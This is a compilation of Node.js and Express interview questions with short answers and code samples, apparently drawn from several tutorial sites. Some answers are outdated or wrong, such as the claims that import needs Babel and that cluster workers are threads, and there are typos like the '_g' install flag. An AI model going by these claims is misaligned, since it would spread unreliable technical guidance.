Error-first callbacks: Use error-first callbacks to handle asynchronous errors in your code. An error-first callback is a callback function that takes an error object as its first argument.
Example:

fs.readFile('/path/to/file', (err, data) => {
  if (err) {
    console.error(err);
    return;
  }
  console.log(data);
});
Middleware functions: Use middleware functions to handle errors that occur in your application. Middleware functions are functions that can be used to handle requests and responses in your application.
Example:

app.use((err, req, res, next) => {
  console.error(err);
  res.status(500).send('Internal Server Error');
});
By handling errors in your Node.js application, you can improve its stability and reliability and ensure that your users have a better experience.

Q.81. What is the difference between callback-based and Promise-based asynchronous programming in Node.js?

Solution: Callback-based asynchronous programming is an older approach that passes a function as an argument to an asynchronous function, while Promise-based programming is a newer approach that uses Promise objects to represent the eventual completion of an asynchronous operation. Promises simplify error handling and provide a cleaner syntax, while callbacks can be harder to read and maintain. Node.js supports both approaches.

Q.82. What is the purpose of the "fs" module in Node.js, and how is it used for file I/O operations?

Solution: The "fs" module in Node.js provides functionality for file I/O operations, such as reading, writing, updating, and deleting files. It allows Node.js applications to interact with the file system on the local machine or server. The module provides both synchronous and asynchronous methods for file I/O operations, allowing developers to choose the most appropriate approach for their use case. For example, "fs.readFile" is an asynchronous method that reads the contents of a file, while "fs.readFileSync" is a synchronous method that reads the contents of a file. Developers can also use the "fs" module to create, move, rename, and delete files and directories.

Q.83. How do you optimize the performance of a Node.js application?

Solution: There are several ways to optimize the performance of a Node.js application, including:

Minimizing blocking operations: Use asynchronous, non-blocking operations wherever possible to avoid blocking the event loop.
Using a load balancer: Distribute incoming requests across multiple servers to prevent overload on a single server.
Implementing caching: Cache frequently accessed data in memory or use a caching service to reduce the number of requests to the server.
Implementing server-side rendering: Pre-rendering server-side components of your application can improve the load time for users.
Monitoring and profiling: Monitor your application's performance using tools like Node.js Profiler or New Relic to identify performance bottlenecks and optimize your code.
By implementing these strategies, you can significantly improve the performance of your Node.js application.

Q.84. How do you deploy a Node.js application to a production server?

Solution: Deploying a Node.js application to a production server typically involves the following steps:

Choose a hosting provider: There are many hosting providers that support Node.js applications, such as AWS, Google Cloud, and Heroku. Choose a provider that suits your needs and budget.
Set up the server: Once you have chosen a provider, you need to set up a server to host your application. This involves creating an instance, configuring security settings, and installing any required dependencies.
Configure environment variables: You should configure environment variables on your server to store sensitive information, such as API keys and database credentials.
Deploy the application: There are different ways to deploy a Node.js application, such as using Git or an FTP client. You should choose a method that works best for your project.
Start the application: Once the application is deployed, you need to start it on the server. This typically involves running a command like "npm start" or "node app.js".
Monitor the application: You should monitor your application for errors and performance issues using tools like PM2 or New Relic.
By following these steps, you can deploy a Node.js application to a production server and ensure that it is secure, stable, and performant.

Q.85. What is the difference between the "require" and "import" statements in Node.js?

Solution: The require statement is the traditional way of importing modules in Node.js, while the import statement is a newer way introduced in ECMAScript 6 (ES6) that provides more advanced features such as named imports and default exports. The import statement is also syntactically different from the require statement, as it uses the ES6 module syntax rather than the CommonJS syntax used by require. However, import is not yet natively supported in Node.js and requires the use of a transpiler such as Babel. Therefore, in most Node.js applications, the require statement is still the preferred way of importing modules.

Q.86. What is serverless computing, and how can you use it with Node.js?

Solution: Serverless computing is a cloud computing model where the cloud provider manages the infrastructure and automatically allocates resources as needed. With Node.js, you can use serverless computing platforms such as AWS Lambda or Google Cloud Functions to write and deploy functions that are triggered by events or HTTP requests without having to worry about managing servers or scaling infrastructure.

Q.87. What is the purpose of the "os" module in Node.js, and how is it used for system-level operations?

Solution: The "os" module in Node.js provides a set of utilities for operating system-related tasks. It can be used to get information about the system's operating system, CPU, memory, network interfaces, and more. The module also provides functions for performing platform-specific operations, such as creating child processes and handling signals. This module is useful for building cross-platform applications that require system-level access.

Q.88.  How can you maintain code organization and modularity over time?

Solution: To maintain code organization and modularity over time in a Node.js project, you can follow these best practices:

Use a modular architecture: Break your code into modules that perform specific functions and can be easily tested and reused. This can be done using features like modules, classes, and functions.
Use version control: Use a version control system like Git to track changes to your code over time, and ensure that your project remains organized and easy to maintain.
Use a consistent coding style: Adopt a consistent coding style across your project to make it easier to read, understand, and maintain. Use tools like ESLint to enforce coding standards and catch potential errors.
Use automated testing: Write automated tests to ensure that changes to your code do not break existing functionality. This helps maintain code organization and modularity over time.
Use documentation: Document your code using tools like JSDoc to help other developers understand how your code works and how to use it. This makes it easier to maintain code organization and modularity over time.
By following these best practices, you can maintain code organization and modularity over time, making it easier to develop, test, and maintain your Node.js project as it evolves.

Q.89. How do you handle database interactions in a Node.js application, and what libraries or frameworks are commonly used?

Solution: In Node.js, database interactions can be handled using libraries or frameworks like Sequelize, Mongoose, or knex.js. These libraries provide a higher-level API for interacting with databases and can help manage connections, handle queries, and model data. Additionally, it is common to use the asynchronous nature of Node.js to handle database operations in a non-blocking way to improve application performance.

Q.90. How do you use environment variables in a Node.js application, and why are they important?

Solution: Environment variables are a key aspect of configuring and deploying Node.js applications. They allow you to specify configuration values, API keys, and other sensitive information outside of your codebase, making it easier to manage and secure your application.

In Node.js, you can access environment variables using the process.env object. You can set environment variables locally using a .env file or through your system's command line interface. When deploying to production, you can set environment variables through your hosting provider or cloud service.

By using environment variables, you can easily manage configuration values for different environments (development, staging, production), keep sensitive information separate from your codebase, and make it easier to deploy and scale your application.

Q.91. What is the purpose of the "net" module in Node.js, and how is it used for creating TCP/IP servers and clients?

Solution: The "net" module in Node.js provides a way to create TCP/IP servers and clients for network communication. It allows developers to create TCP servers that listen for incoming connections, as well as TCP clients that can initiate connections to remote servers. The module provides methods for creating both server and client instances, as well as for sending and receiving data over the network. Additionally, the "net" module also provides options for configuring the behavior and settings of TCP connections.

Q.92. How do you implement caching in a Node.js application, and what caching strategies are commonly used?

Solution: To implement caching in a Node.js application, you can use in-memory caching, distributed caching, or persistent caching. In-memory caching is useful for storing small amounts of data, while distributed caching is better suited for larger data sets and high-traffic applications. Persistent caching involves storing data on disk, which can help reduce load times and improve performance. Commonly used caching libraries in Node.js include Redis, Memcached, and Node-cache. To implement caching, you can use caching middleware or cache API calls manually in your code. It is important to consider cache expiration policies, cache invalidation strategies, and potential memory issues when implementing caching in your application.

Q.93. What is the difference between a monolithic and microservices architecture, and how does Node.js fit into each one?

Solution: A monolithic architecture is a traditional approach where an application is built as a single, large codebase with all components tightly coupled together. In contrast, a microservices architecture is an approach where an application is composed of small, independently deployable services that communicate with each other via APIs.

Node.js can be used in both monolithic and microservices architectures. In a monolithic architecture, Node.js can be used to build the entire application as a single, scalable unit. In a microservices architecture, Node.js can be used to build individual services that are lightweight and can be easily deployed and scaled independently. Node.js is particularly well-suited for building microservices due to its non-blocking I/O and event-driven architecture.

Q.94. What is the purpose of the "events" module in Node.js, and how is it used for event-driven programming?

Solution: The "events" module in Node.js is a core module that provides a way to handle and respond to events. It allows developers to create and emit custom events and build event-driven applications. The module provides an EventEmitter class that serves as a central hub for registering and triggering event listeners. Developers can use this module to create custom event emitters and listeners, which can be useful in scenarios such as building a real-time chat application or handling file system events.

Q.95. What is the purpose of the "child_process" module in Node.js, and how is it used for running external processes?

Solution: The "child_process" module in Node.js is used for running external processes, such as system commands or other executables. It provides a way to spawn child processes and communicate with them using streams or callbacks. This module can be used to run CPU-intensive tasks in separate processes to avoid blocking the main Node.js event loop or to interact with other programs and services on the system. The "child_process" module also supports spawning child processes with different options, such as running them in detached mode or with custom environment variables.

Q.96. What is the purpose of the "cluster" module in Node.js, and how is it used for load balancing?

Solution: The "cluster" module in Node.js is used to enable the creation of child processes that can share server ports, allowing for load balancing across multiple CPU cores. Each child process runs in a separate thread and can handle incoming requests. The module provides several strategies for distributing the workload, such as round-robin, and can also restart failed processes automatically. This helps to improve the performance and reliability of Node.js applications by utilizing the full potential of the underlying hardware.

Q.97. How can you debug and profile Node.js applications for performance issues?

Solution: To debug and profile Node.js applications for performance issues, you can use the built-in debugging tools in Node.js, such as the Node.js Debugger and the Chrome DevTools. You can also use third-party tools like Visual Studio Code, which has built-in debugging support for Node.js applications. To profile the performance of a Node.js application, you can use the built-in Node.js Profiler or third-party profiling tools like Node.js-Prof. Additionally, you can use load testing tools like Artillery and Apache JMeter to simulate high traffic and measure the performance of your Node.js application under stress.

Q.98. How can you handle file uploads in a Node.js web application?

Solution: To handle file uploads in a Node.js web application, you can use the "multer" middleware. Here are the general steps:

Install "multer" using npm
Require "multer" in your application
Configure "multer" with the desired settings, such as the destination directory and filename
Add the "multer" middleware to your file upload route
Access the uploaded file in your route handler using the "req.file" object
With "multer," you can easily handle file uploads in your Node.js web application and customize the upload settings as needed.

Q.99. What are some popular Node.js frameworks for building web applications, and what are their key features?

Solution: Node.js has several popular frameworks for building web applications, including Express, Koa, Hapi, NestJS, and Sails.js.

Express is the most widely used Node.js framework and is known for its simplicity, flexibility, and robust routing capabilities. Koa is a lightweight framework with a focus on modularity and easy error handling. Hapi is a configuration-centric framework that emphasizes security and extensibility. NestJS is a TypeScript-based framework that uses decorators to enable modular and scalable code. Sails.js is an MVC framework that uses Waterline ORM to simplify database management.

Each framework has its own unique features and strengths, and the choice of which one to use depends on the specific needs and requirements of the project.

Q.100. How can you secure a Node.js web application from common security vulnerabilities, such as XSS and CSRF attacks?

Solution: To secure a Node.js web application from common security vulnerabilities, such as XSS and CSRF attacks, developers should follow best practices, such as input validation, output encoding, and session management. They can also use middleware modules, such as Helmet, to add extra security headers to HTTP responses. Additionally, implementing measures such as HTTPS, Content Security Policy (CSP), and rate limiting can help to further enhance the security of the application. It's also essential to keep dependencies up-to-date and regularly perform security audits to identify and address any potential vulnerabilities.

Conclusion
In conclusion, our extensive guide on 'Node.js interview questions' serves as a valuable resource for developers of all experience levels. By providing a comprehensive list of 100 essential questions spanning from the basics to advanced concepts, this guide is designed to help you navigate the Node.js interview process with confidence and poise.

Remember, practice makes perfect. As you work through these questions and deepen your understanding of Node.js, your confidence will grow, allowing you to tackle even the most challenging interviews. Keep honing your skills, and don't be afraid to revisit this guide whenever you need a refresher. For more fundamental concepts check out our free Node Js Tutorial.

1.    What is Node.Js and its features?
Node.js is a runtime platform based on the JavaScript engine in Google Chrome. A single thread model loops its events using the concurrency model.

Rather than blocking an application, it assists in the registration of a callback to the new application. This allows the current application to continue.

As a result, concurrent operations can be handled without the need for multiple execution threads. It interacts with a filesystem using JavaScript and C or C++.

The following are the main characteristics of node.js:

Node.js Library: The majority of developers are already familiar with JavaScript. Node.js includes a JavaScript library. As a result, node.js is simple to use for developers.
Single-threaded and highly scalable: It uses a single thread for event looping. Although the responses may not reach the server promptly, no operations are halted. In addition, Node.js creates a single thread to handle many requests, whereas traditional servers have limited threads to handle requests.
No buffer: These applications do not require a buffer and simply send data in chunks.
Also Read:  How to Elevate Skill Set with CodeQuoteint's Software Engineering Bootcamp
2.    What is tracing?
You can trace information generated by V8 using tracing. It can be enabled by starting the node with the flag — trace-events-enabled.

The flag –trace-event-categories can be used to specify all of the recorded categories. Chrome:/tracing can be used to open the logs that have been enabled.

3.    What is callback hell?
Callback hell, sometimes known as the ‘Pyramid of Doom,’ is an asynchronous programming anti-pattern. Terminologically, it is a slang phrase for many interconnected “if” statements or functions.

A few callbacks appear innocuous if your application logic will not get too complicated. However, as your project’s requirements grow, you’ll rapidly find yourself with layers of nested callbacks that can be problematic.

4.    How to avoid Callback hell?
Since Node.js only uses a single thread, many events may be queued. As a result, whenever a long-running query completes its execution, the callback associated with the query is executed. The following steps can be taken to resolve this problem:

Modular code: This code will be broken into smaller modules and later connected to the main module to achieve the desired outcome.
Promise mechanism: This is a different way to write async code. This mechanism ensures either a successful or unsuccessful outcome. They accept two optional arguments, one of which is called depending on the state of promise.
Use of generators: These routines use the yield keyword to wait and resume. Asynchronous operations can also be suspended and resumed.
Async mechanism: This method allows for a sequential execution flow. The <async.waterfall> API in this module passes data from one operation to the next using the next callback. The primary method is the caller, which is called only once via a callback.
Also Read:  How to Transition From Engineering Student to Working Professional
Advanced Node.js Interview Questions
Let’s get started:

1.    What is NPM?
NPM stands for Node Package Manager. It serves two primary purposes:

It is based on the Online Repository for node.ls packages found at nodejs.org.
It manages versions and works as a command-line utility.
You can check the version with the command below:

npm -version

To install any module:

Npm install <Module Name>

2.    Which database is the most popular among Node.js users?
The most popular database for Node.js is MongoDB. It’s a document-oriented, NoSQL, cross-platform database with high performance, high availability, and easy scalability.

3.    What is REPL in Node.js?
The acronym REPL stands for Read Eval Print Loop, and it is a computer environment. It’s similar to a command prompt on a Windows console or a Unix/Linux shell. The system then produces an output. It performs the following tasks:

–       READ: It takes user input, parses it into JavaScript, and then stores it in memory.

–        EVAL: It runs the data structure used to store the information.

–        PRINT: It outputs the result of the command execution.

–      LOOP: The above command is repeated until the developer presses Ctrl + C twice.

4.    What is event-driven programming?
The event-driven programming method heavily relies on events to initiate various functions. An event in this scenario could be anything, such as pressing a key or clicking a mouse button.

Following the ‘publish-subscribe’ pattern, whenever an event occurs, a call-back function already registered with the element is executed. Node.js is faster than other comparable technologies because of this programming approach.

Also Read:  The State of Data Scientist Jobs 2023: Trends and Opportunities
CodeQuotient- Your Ideal Coding Partner
At CodeQuotient, we offer to learn solutions based on today’s technological demands. We begin our full-stack training with HTML5, CSS, and React on the front end and Node.js, Express, and MongoDB on the back end.

Our SuperCoders program is for a  hand-picked group of the best students from across the country. The program’s environment teaches you how to work in a team and communicate with your teammates. It will become a valuable asset for any working professional over time.

So, if you want to learn how to code, work on real-world projects, and prepare for future placements, the SuperCoders Program is for you. The goal is to mold students into prompt professionals while also developing their personalities.

Master Node.js (with Express) Interview Questions
Node.js with Express is a popular stack for building scalable web applications. This comprehensive guide covers essential interview questions for junior, intermediate, and senior roles, helping you prepare for your next job interview.

Get Prepared for Your Node.js Interview!
Node.js at codeinterview
Your Ultimate Guide to Node.js Interview Success
Introduction to Node.js with Express
Node.js is a runtime environment that allows you to run JavaScript on the server side. Built on Chrome's V8 JavaScript engine, Node.js is designed for building scalable network applications. Express.js is a minimal and flexible Node.js web application framework that provides a robust set of features for web and mobile applications. It simplifies routing, middleware management, and request handling, making it a go-to choice for developers working on server-side applications.

Table of Contents
Junior-Level Node.js Interview Questions
Mid-Level Node.js Interview Questions
Expert-Level Node.js Interview Questions
Proven Strategies and Best Practices for Node.js Interview

Junior-Level Node.js Interview Questions
Here are some junior-level interview questions for Node.js with Express:

Question 01: What is Node.js, and how does it work?

Answer: Node.js is a JavaScript runtime environment that allows you to run JavaScript on the server side. It uses the V8 engine for executing code and features a non-blocking, event-driven architecture for handling I/O operations efficiently.

Node.js processes tasks through a single-threaded event loop, managing multiple operations concurrently. This design is ideal for scalable network applications.

const http = require('http');
const server = http.createServer((req, res) => {
  res.end('Hello World');
});
server.listen(3000);
Question 02: Explain the role of the 'package.json' file in a Node.js project.

Answer: The package.json file in a Node.js project manages project metadata, dependencies, and scripts. It specifies the project's name, version, and author, and lists dependencies needed for the project.

It also defines custom scripts for tasks like testing or starting the application, which can be run with npm run. For example:

{
  "name": "my-node-app",
  "version": "1.0.0",
  "scripts": {
    "start": "node index.js",
    "test": "mocha"
  },
  "dependencies": {
    "express": "^4.17.1"
  }
}        
Question 03: What is Express.js and how does it relate to Node.js?

Answer: Express.js is a web framework for Node.js that simplifies building server-side applications. It provides tools for routing, middleware, and handling HTTP requests and responses.

Express.js builds on Node.js by offering a more user-friendly API for creating web servers and APIs.

const express = require('express');
const app = express();

app.get('/', (req, res) => res.send('Hello World'));
app.listen(3000);
In this example, Express.js creates a server that responds with "Hello World" to requests at the root URL.
Question 04: How do you install Express.js in a Node.js project?

Answer: You can install Express.js using npm (Node Package Manager) with the following command:

npm install express        
Question 05: How do you define a route in Express.js?

Answer: In Express.js, routes are defined using methods that correspond to HTTP methods. For example:

app.get('/path', (req, res) => {
  res.send('GET request to the homepage');
});
        
app.get() handles GET requests to the specified path, while app.post(), app.put(), and app.delete() handle POST, PUT, and DELETE requests, respectively.
Question 06: What is middleware in Express.js? Provide an example.

Answer: Middleware functions in Express.js are functions that have access to the request object (req), the response object (res), and the next middleware function in the application's request-response cycle. Middleware can perform tasks such as executing code, modifying the request and response objects, ending the request-response cycle, and calling the next middleware function. For example:

const express = require('express');
const app = express();

app.use((req, res, next) => {
  console.log('Request URL:', req.originalUrl);
  next();
});

app.get('/', (req, res) => {
  res.send('Hello World!');
});

app.listen(3000, () => {
  console.log('Server is running on port 3000');
});
Question 07: How can you handle POST requests in Express.js?

Answer: To handle POST requests in Express.js, you use the app.post() method and typically parse the incoming request body using middleware such as body-parser or the built-in express.json(). For example:

const express = require('express');
const app = express();
app.use(express.json());

app.post('/submit', (req, res) => {
  res.send(`Received data: ${JSON.stringify(req.body)}`);
});

app.listen(3000, () => {
  console.log('Server is running on port 3000');
});
Question 08: What is npm, and how is it used in Node.js?

Answer: npm (Node Package Manager) is a package manager for JavaScript. It manages packages and dependencies for Node.js projects. npm commands like npm install are used to add packages, npm update updates them, and npm uninstall removes them. The package.json file lists project dependencies and scripts for development tasks.

Question 09: What will be the output of this Node.js code?

let obj = { a: 1, b: 2 };
delete obj.b;
console.log(obj);        
Answer: The result will be:

{ a: 1 }        
Question 10: How do you serve static files in an Express application?

Answer: To serve static files in an Express application, you use the built-in middleware express.static(). This middleware serves static assets such as HTML, CSS, JavaScript, and images from a specified directory. For example:

const express = require('express');
const app = express();
app.use(express.static('public'));

app.get('/', (req, res) => {
  res.send('Welcome to the homepage!');
});

app.listen(3000, () => {
  console.log('Server is running on port 3000');
});


Mid-Level Node.js Interview Questions
Here are some mid-level interview questions for Node.js with Express:

Question 01: Explain the concept of middleware chaining in Express.js.

Answer: Middleware chaining in Express.js refers to the process of executing multiple middleware functions in sequence. Each middleware function performs specific tasks such as logging requests, handling authentication, or parsing request bodies. Middleware functions must call the next() function to pass control to the next middleware function in the chain. This approach allows for modular and maintainable code.

const express = require('express');
const app = express();

// Middleware function 1
app.use((req, res, next) => {
  console.log('Middleware 1');
  next(); // Passes control to the next middleware function
});

// Middleware function 2
app.use((req, res, next) => {
  console.log('Middleware 2');
  next(); // Passes control to the next middleware function
});

// Route handler
app.get('/', (req, res) => {
  res.send('Hello World!');
});

app.listen(3000, () => {
  console.log('Server is running on port 3000');
}); 
Question 02: How do you handle error middleware in Express.js?

Answer: Error-handling middleware in Express.js has four parameters: err, req, res, and next. This middleware catches and handles errors that occur in the application. It should be defined after all other middleware and route handlers. For example:

app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).send('Something broke!');
});
Question 03: What are some common HTTP methods, and how are they used in Express.js routes?

Answer: Common HTTP methods include GET, POST, PUT, DELETE, PATCH, and OPTIONS. In Express.js, these methods are used to define routes that handle specific types of requests:

app.get('/', (req, res) => res.send('GET request'));
app.post('/', (req, res) => res.send('POST request'));
app.put('/user', (req, res) => res.send('PUT request'));
app.delete('/user', (req, res) => res.send('DELETE request'));
        
Question 04: How do you manage environment variables in a Node.js application?

Answer: Environment variables in Node.js are managed using the .env file and the dotenv package. The .env file contains key-value pairs of environment-specific settings, which are loaded into process.env by calling dotenv.config().

require('dotenv').config();
const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
Question 05: How can you handle file uploads in an Express application?

Answer: File uploads in Express applications are managed using the multer middleware. It processes multipart/form-data, which is used for file uploads. For example:

const multer = require('multer');
const upload = multer({ dest: 'uploads/' });

app.post('/upload', upload.single('file'), (req, res) => {
  res.send('File uploaded successfully!');
});
Question 06: What is the purpose of the next function in Express middleware?

Answer: In Express.js, the next function is used to pass control from one middleware function to the next in the stack. By calling next(), you ensure that the request moves forward to the subsequent middleware or route handler, allowing you to chain multiple middleware functions for tasks like authentication, logging, or request parsing.

If next is not called, the request will hang and not proceed through the middleware chain, potentially causing the application to become unresponsive. It’s crucial for the flow of requests and responses in an Express application, ensuring that all intended middleware functions and route handlers are executed in sequence.

Question 07: What will be the output of the following Node.js code?

const x = [10, 20, 30];
const y = x.slice(1, 2);
console.log(y);

        
Answer: The output will be:

[20]    
Question 08: How do you implement session management in an Express application?

Answer: Session management in Express can be implemented using the express-session middleware. This middleware allows you to create and manage user sessions, storing session data on the server-side. For example:

const session = require('express-session');

app.use(session({
  secret: 'secret-key',
  resave: false,
  saveUninitialized: true,
  cookie: { secure: true }
}));

app.get('/', (req, res) => {
  if (req.session.views) {
    req.session.views++;
    res.send(`Number of views: ${req.session.views}`);
  } else {
    req.session.views = 1;
    res.send('Welcome to the homepage!');
  }
});        
Question 09: What are some common security practices for Express applications?

Answer: Common security practices for Express applications include:

Use HTTPS: Encrypt data between the server and client.
Validate and Sanitize Inputs: Prevent XSS and SQL injection attacks.
Use Environment Variables: Store sensitive data securely.
Implement Rate Limiting: Protect against DDoS attacks.
Secure Cookies: Set httpOnly, secure, and sameSite attributes.
Use Security Headers: Implement security headers with helmet middleware.
Protect Against Common Vulnerabilities: Mitigate XSS, CSRF, and SQL injection.
Question 10: How can you optimize the performance of a Node.js (with Express) application?

Answer: To optimize the performance of a Node.js (with Express) application, you can implement techniques such as caching, using a load balancer, optimizing database queries, using compression middleware, minimizing middleware usage, and ensuring non-blocking code. Additionally, profiling and monitoring the application can help identify and address performance bottlenecks.



Expert-Level Node.js Interview Questions
Here are some expert-level interview questions for Node.js with Express:

Question 01: Explain the event loop in Node.js and how it handles asynchronous operations.

Answer: The event loop is a core concept in Node.js that allows it to handle asynchronous operations in a non-blocking manner. It is a single-threaded loop that continuously checks for events, processes them, and delegates I/O operations to the system's kernel whenever possible. The event loop has several phases, including timers, pending callbacks, idle, poll, check, and close callbacks.

When an asynchronous operation (such as I/O or timers) completes, its callback is placed in the event queue, and the event loop picks it up and executes it. This mechanism allows Node.js to handle many concurrent operations efficiently without blocking the execution of the program.

Question 02: How do you implement authentication and authorization in an Express application?

Answer: Answer: Authentication and authorization in an Express application can be implemented using middleware such as passport. passport provides various strategies for authentication, including local, OAuth, and JWT. You can set up routes to handle login, registration, and protected resources, using middleware to verify user credentials and permissions.

Question 03: What are streams in Node.js, and how do they improve performance?

Answer: Answer: Streams in Node.js are objects that allow you to read or write data in a continuous flow. They improve performance by processing data piece-by-piece (chunks), rather than loading the entire data into memory at once. Streams are useful for handling large files, network communications, and other data-intensive operations. For example:

const fs = require('fs');

// Reading a file using streams
const readableStream = fs.createReadStream('largefile.txt');
readableStream.on('data', (chunk) => {
  console.log(`Received ${chunk.length} bytes of data.`);
});

// Writing to a file using streams
const writableStream = fs.createWriteStream('output.txt');
writableStream.write('This is some data.\n');
writableStream.end('This is the end of the data.');

        
Question 04: How do you handle real-time communication in a Node.js application?

Answer: Real-time communication in a Node.js application is commonly handled using Socket.IO, a library that enables bidirectional and event-based communication between clients and servers. Socket.IO works on top of WebSockets, but it also provides fallbacks for older browsers that do not support WebSockets.

To implement real-time communication, you first need to install Socket.IO and set it up on both the server and client sides. The server establishes a WebSocket connection, listens for events from clients, and can emit events to clients. The client, typically a web browser, connects to the server and communicates through events as well.

Question 05: What is clustering in Node.js, and how does it help with scalability?

Answer: Clustering in Node.js allows you to create multiple instances (workers) of your application that can run on multiple CPU cores. This helps with scalability by distributing incoming requests across the workers, effectively utilizing the available CPU resources and improving the application's throughput. The cluster module in Node.js can be used to set up clustering.

Question 06: How do you use async/await in Node.js to handle asynchronous code?

Answer: async/await is a syntax in JavaScript that allows you to write asynchronous code in a synchronous manner. Functions declared with the async keyword return a promise, and the await keyword can be used to pause the execution of the async function until the promise is resolved. For example:

const fetch = require('node-fetch');

async function fetchData() {
  try {
    const response = await fetch('https://api.example.com/data');
    const data = await response.json();
    console.log(data);
  } catch (error) {
    console.error('Error fetching data:', error);
  }
}

fetchData();
Question 07: What are some advanced routing techniques in Express.js?

Answer: Advanced routing techniques in Express.js include using route parameters, query parameters, and nested routes. You can also use express.Router() to create modular and mountable route handlers. For example:

const express = require('express');
const router = express.Router();

router.get('/users/:userId',(req,res)=>{
const userId = req.params.userId;
res.send(`User ID: ${userId}`);
});

app.use('/api',router);
Question 08: How do you manage database connections in a Node.js (with Express) application?

Answer: Database connections in a Node.js (with Express) application can be managed using connection pooling and ORM libraries such as sequelize for SQL databases or mongoose for MongoDB. Connection pooling helps manage multiple database connections efficiently, reducing the overhead of establishing and closing connections repeatedly.

const mongoose = require('mongoose');

mongoose.connect('mongodb://localhost:27017/mydatabase', {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});

const db = mongoose.connection;
db.on('error', console.error.bind(console, 'connection error:'));
db.once('open', () => {
  console.log('Connected to the database');
});
Question 09: Explain the use of process management tools like PM2 in a Node.js application.

Answer: Process management tools like PM2 are essential for maintaining Node.js applications in production. PM2 ensures continuous operation by automatically restarting applications if they crash, minimizing downtime. It provides features for starting, stopping, and monitoring processes, as well as real-time performance tracking.

PM2 enhances scalability through load balancing and cluster mode, running multiple instances of an application to distribute traffic and fully utilize system resources. It also simplifies log management and can generate startup scripts to ensure applications start on system boot, making it a comprehensive tool for managing Node.js applications in production.

Question 10: What are some strategies for ensuring the security of a Node.js (with Express) application?

Answer: Strategies for ensuring the security of a Node.js (with Express) application include using HTTPS, validating and sanitizing user inputs, implementing authentication and authorization, protecting against common web vulnerabilities (XSS, CSRF, SQL injection), using security headers with helmet, managing environment variables securely, and keeping dependencies up to date. Additionally, performing regular security audits and code reviews can help identify and address potential security issues.



Ace Your Node.js Interview: Proven Strategies and Best Practices
To excel in a Node.js technical interview, it's crucial to have a strong grasp of the language's core concepts. This includes a deep understanding of syntax and semantics, data types, and control structures. Additionally, mastering Node.js approach to error handling is essential for writing robust and reliable code. Understanding concurrency and parallelism can set you apart, as these skills are highly valued in many programming languages.

Core Language Concepts: Syntax, semantics, data types (built-in and composite), control structures, and error handling.
Concurrency and Parallelism: Creating and managing threads, using communication mechanisms like channels and locks, and understanding synchronization primitives.
Standard Library and Packages: Familiarity with the language's standard library and commonly used packages, covering basic to advanced functionality.
Practical Experience: Building and contributing to projects, solving real-world problems, and showcasing hands-on experience with the language.
Testing and Debugging: Writing unit, integration, and performance tests, and using debugging tools and techniques specific to the language.
Practical experience is invaluable when preparing for a technical interview. Building and contributing to projects, whether personal, open-source, or professional, helps solidify your understanding and showcases your ability to apply theoretical knowledge to real-world problems. Additionally, demonstrating your ability to effectively test and debug your applications can highlight your commitment to code quality and robustness.

Node.js interview questions for junior developers
Use the following Node.js interview questions when evaluating junior Node.js programmers:

Question 1: How does a “callback” work in Node.js?

Designer illustration
Get a complimentary discovery call and a free ballpark estimate for your project
Trusted by 100x of startups and companies like
Answer: “Callback” is a function in Node.js. A program calls it after a task. This allows the program to run another piece of code at that time, and there’s no blocking. Node.js supports asynchronous processing. This depends on the callback functions, and the Node.js APIs support this function.

Question 2: Explain the differences between Node.js and JavaScript.

Answer: The main differences between JavaScript and Node.js are as follows:

JavaScript is a programming language, whereas, Node.js is a runtime environment. Node.js is based on JavaScript, and it holds many important libraries.
JavaScript is used for client-side programming, however, Node.js is for backend development.
JavaScript can run on different engines, whereas, Node.js runs on the V8 engine.
Question 3: Explain the advantage of the “async” processing in Node.js.

Answer: Node.js supports “async” processing, and it does that in a single-threaded manner. The combination of single-threading with “async” processing can deliver better performance and scalability in web applications. This combination can handle the typical patterns of the load in web apps better than a thread-based implementation.

Question 4: Can Node.js support JSON object storage databases?

Answer: Node.js is based on JavaScript. You can use JavaScript, HTML, and CSS for the front end, and you can use Node.js for the back end.

On the other hand, MongoDB uses JavaScript for querying. MongoDB is a very popular NoSQL database. It stores documents using the “BSON” format, which means “Binary JSON”. Node.js works very well with databases like MongoDB, which is a key advantage of this runtime environment.

Question 5: Explain the concept of global installation of dependencies in Node.js.

Answer: Node.js stores globally installed packages or dependencies in the “/npm” directory. Programmers can use such dependencies in the “Command Line Interface” (CLI) functions of Node.js projects.

However, developers can’t import these dependencies using the “require()” function in a Node.js application. Programmers can install a Node.js project globally by using the “-g” flag. The syntax is the following:


Copy
<i>
C: Nodejs_WorkSpace>npm install express _g
</i>
Question 6: Explain the functions of NPM.

Answer: NPM (Node Package Manager) is a very important tool in the hands of Node.js developers. Programmers can easily find important packages and modules for Node.js by using NPM, which manages the Node.js packages and modules.

NPM offers the following key functionalities:

It provides online repositories for Node.js packages and modules. Developers can easily search this repository and find what they need.
NPM provides an easy-to-use “Command Line Interface” (CLI) to install Node.js packages and modules. Node.js programmers typically use several such packages to develop a Node.js application. NPM makes it easy for them to install such packages.
NPM manages the Node.js versions and dependencies.
Question 7: Explain the functions of “EventEmitter” in Node.js.

Answer: An “EventEmitter” in Node.js is a class. It holds all the objects that can emit events. If an object from the “EventEmitter” class throws an event, Node.js calls all the attached functions synchronously.

Question 8: How to spawn Node.js “child processes”?

Answer: Developers can spawn a Node.js “child process” by using the “child_process” module of Node.js. These processes can communicate easily with each other since Node.js provides a messaging system. The spawn function creates a node module on the processor which means that multiple workers are running on a single node code base for multiple tasks.

Programmers can create Node.js “child processes” on Linux, Unix, Windows, OS X, etc. They can use the following processes for that:

“spawn()”;
“fork()”;
“exec()”;
“execFile().
Question 9: How does the “process.nextTick()” work in Node.js?

Answer: The Node.js core API provides several global objects, and the “process” object is one of them. A Node.js program can access it from anywhere. Therefore, such a program can access the associated methods too.

One such method is the “process.nextTick” method. This function schedules code execution and adds the callback function to the start of the next event queue. Node.js programmers use it in real-time applications, and they defer the execution of a function until the event loop iteration.

Question 10: Why should the Node.js developers avoid the “callback hell”?

Answer: “Callback hell” is a pattern of coding, which is disadvantageous. Programmers sometimes code intensely nested callbacks. Such pieces of code contain multiple nested callbacks.

Such coding practices make the program hard to read, and such programs are hard to debug. The maintainability of the program suffers due to “callback hells”. Developers should implement the asynchronous logic effectively. Programs with a “callback hell” signify that the programmer didn’t code asynchronous logic properly.

Question 11: Explain the differences between front-end development and back-end development.

Answer: The differences between front-end development and back-end development are as follows:

Front-end development concerns the development of the client side of the application. On the other hand, back-end development concerns server-side development.
